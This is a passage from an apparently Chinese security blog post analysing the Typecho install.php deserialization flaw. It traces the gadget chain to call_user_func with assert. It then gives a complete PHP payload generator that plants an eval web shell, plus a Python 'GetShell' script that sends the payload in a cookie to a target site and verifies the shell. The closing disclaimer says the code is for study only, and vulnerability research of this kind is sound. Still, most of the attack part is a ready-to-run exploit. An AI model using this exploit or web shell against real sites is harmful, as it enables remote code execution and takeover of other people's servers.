<p>$key的值是screenNamem,<br>因此<code>$this-&gt;_params</code>需要是个键为screenNamem的数组，键值为想执行的代码,<br>最终$value传进call_user_func<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</div><div class="line">                $value = <span class="keyword">$this</span>-&gt;_params[$key];</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</div><div class="line">                $value = <span class="keyword">self</span>::$_httpParams[$key];</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                $value = $default;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>进入_applyFilter后,可以看见 call_user_func，<br>这时需要设置<code>$this-&gt;_filter</code>为arrsert，作为call_user_func的第一个参数，<br>$value我们也可控，已经可以执行任意代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</div><div class="line">                $value = is_array($value) ? array_map($filter, $value) :</div><div class="line">                call_user_func($filter, $value);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> $value;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>主要用于生成__typecho_config 的Payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">* Created by PhpStorm.</span></div><div class="line"><span class="comment">* Date: 2017/11/03</span></div><div class="line"><span class="comment">* Time: 9:17</span></div><div class="line"><span class="comment">* 生成 _typecho_config 的值</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</div><div class="line">    <span class="keyword">private</span> $_type;</div><div class="line">    <span class="keyword">private</span> $_charset;</div><div class="line">    <span class="keyword">private</span> $_lang;</div><div class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($version, $type = self::RSS2, $charset = <span class="string">'UTF-8'</span>, $lang = <span class="string">'en'</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_version = $version;</div><div class="line">        <span class="keyword">$this</span>-&gt;_type = $type;</div><div class="line">        <span class="keyword">$this</span>-&gt;_charset = $charset;</div><div class="line">        <span class="keyword">$this</span>-&gt;_lang = $lang;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'fputs(fopen(\'./usr/themes/default/img/c.php\',\'w\'),\'&lt;?php @eval($_POST[a]);?&gt;\')'</span>);</div><div class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</div><div class="line">    <span class="comment">//private $_filter = array('assert', array('Typecho_Response', 'redirect'));</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = <span class="keyword">new</span> Typecho_Feed(<span class="number">5</span>, <span class="string">'ATOM 1.0'</span>);</div><div class="line">$payload2 = <span class="keyword">new</span> Typecho_Request();</div><div class="line">$payload1-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $payload2));</div><div class="line">$exp[<span class="string">'adapter'</span>] = $payload1;</div><div class="line">$exp[<span class="string">'prefix'</span>] = <span class="string">'Rai4over'</span>;</div><div class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure></p>
<h1 id="编写payload的简单思路"><a href="#编写payload的简单思路" class="headerlink" title="编写payload的简单思路"></a>编写payload的简单思路</h1><p>最外层$exp是数组，数组中的’adapter’是Typecho_Feed的实例$payload1,<br>$payload1的构造参数是’ATOM 1.0’用于控制分支,<br>$payload2是Typecho_Request的实例,<br><code>private $_filter</code> ，<code>private $_params</code>是传给call_user_func的参数，也就是通过assert写shell<br>然后$payload2通过additem添加到$payload的<code>$_items</code>的变量中<br>最后把$payload1添加到最外层的$exp数组中<br>ps：因为install.php中有ob_start();所以构造好是没有回显的，但是也能写shell<br>后面其他师傅说可以用Typecho_Response类中的redirect方法中的exit()得到回显</p>
<h1 id="GetShell小工具"><a href="#GetShell小工具" class="headerlink" title="GetShell小工具"></a>GetShell小工具</h1><p>记得把php添加进环境变量<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'''</span></div><div class="line"><span class="string">    Www.ChaBug.Org</span></div><div class="line"><span class="string">    '''</span></div><div class="line"></div><div class="line">    targert_url = <span class="string">'http://www.xxxx.com'</span>;</div><div class="line"></div><div class="line">    rsp = requests.get(targert_url + <span class="string">"/install.php"</span>);</div><div class="line">    <span class="keyword">if</span> rsp.status_code != <span class="number">200</span>:</div><div class="line">        exit(<span class="string">'The attack failed and the problem file does not exist !!!'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'You are lucky, the problem file exists, immediately attack !!!'</span></div><div class="line"></div><div class="line">    proxies = &#123;<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>, <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>, &#125;</div><div class="line"></div><div class="line">    typecho_config = os.popen(<span class="string">'php exp.php'</span>).read()</div><div class="line"></div><div class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</div><div class="line">              <span class="string">'Cookie'</span>: <span class="string">'antispame=1508415662; antispamkey=cc7dffeba8d48da508df125b5a50edbd; PHPSESSID=po1hggbeslfoglbvurjjt2lcg0; __typecho_lang=zh_CN;__typecho_config=&#123;typecho_config&#125;;'</span>.format(typecho_config=typecho_config),</div><div class="line">              <span class="string">'Referer'</span>: targert_url&#125;</div><div class="line"></div><div class="line">    url = targert_url + <span class="string">"/install.php?finish=1"</span></div><div class="line"></div><div class="line">    requests.get(url,headers=headers,allow_redirects=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    shell_url = targert_url + <span class="string">'/usr/themes/default/img/c.php'</span></div><div class="line">    <span class="keyword">if</span> requests.get(shell_url).status_code == <span class="number">200</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'shell_url: '</span> + shell_url</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Getshell Fail!"</span></div></pre></td></tr></table></figure></p>
<p>PS:代码仅用于学习研究，请勿用于非法用途恶意攻击，否则后果作者概不负责。</p>

    
  </div>
</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持ChaBug</div>
        <ul class="theme.donation.items.length">
        
          <li class="item">
            <img src="/images/qr-wechat.png" alt="">
          </li>
        
          <li class="item">
            <img src="/images/qr-alipay.png" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2017/11/02/ssr-share/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2017/11/03/typecho-tools/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              归档
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/atom.xml"
              rel="noopener noreferrer"
              target="_blank"
              >
              RSS
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/search/"
              rel="noopener noreferrer"
              target="_self"
              >
              搜索
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    




    

    
	
  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
